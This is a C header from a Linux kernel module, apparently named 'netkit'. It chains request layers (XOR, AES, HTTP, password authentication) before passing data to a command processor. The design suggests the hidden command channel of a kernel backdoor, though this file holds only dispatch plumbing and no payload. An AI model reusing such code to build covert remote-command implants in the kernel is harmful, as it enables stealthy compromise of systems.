#ifndef PIPELINE__IFACE_H
#define PIPELINE__IFACE_H

#include <linux/types.h>
#include <linux/kallsyms.h>

#include "../sys/debug.h"
#include "../sys/mem.h"
#include "../cmd/iface.h"

typedef int (*pipeline_func_t)(void *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen);

static inline int call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen);

#include "xor/xor.h"
#include "aes/aes.h"
#include "http/http.h"
#include "auth_password/auth_password.h"

static inline int pipeline_final_process(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    return cmd_process(req_buf, req_buflen, res_buf, res_buflen);
}

static inline int _do_call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    return pipeline_funcs[index](pipeline_funcs, index, req_buf, req_buflen, res_buf, res_buflen);
}

static inline int call_next_layer(pipeline_func_t *pipeline_funcs, size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    int retv;

#if CONFIG_NETKIT_DEBUG
    char *sym_name;

    // for some reason symbol names are this big???
    sym_name = kzmalloc(1024, GFP_KERNEL);
    if (IS_ERR(sym_name))
        return PTR_ERR(sym_name);

    retv = sprint_symbol(sym_name, (unsigned long)pipeline_funcs[index]);
    if (retv < 0)
        return retv;

    NETKIT_LOG("[*] calling '%s' (req_buflen: %lu)\n", sym_name, req_buflen);
#endif
    retv = _do_call_next_layer(pipeline_funcs, index, req_buf, req_buflen, res_buf, res_buflen);
#if CONFIG_NETKIT_DEBUG
    NETKIT_LOG("[%c] returned '%s' (res_buflen: %lu, retv: %d)\n", retv >= 0 ? '+' : '!', sym_name, *res_buflen, retv);

    kzfree(sym_name, 1024);
#endif

    return retv;
}

static inline int pipeline_process(pipeline_func_t *pipeline_funcs, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    // this only returns an error when the first pipeline layer is returning an error
    // we need to redo all registers here since we  insert the index param at call_next_layer
    // - this is worth it for clarity
    return call_next_layer(pipeline_funcs, 0, req_buf, req_buflen, res_buf, res_buflen);
}


#endif
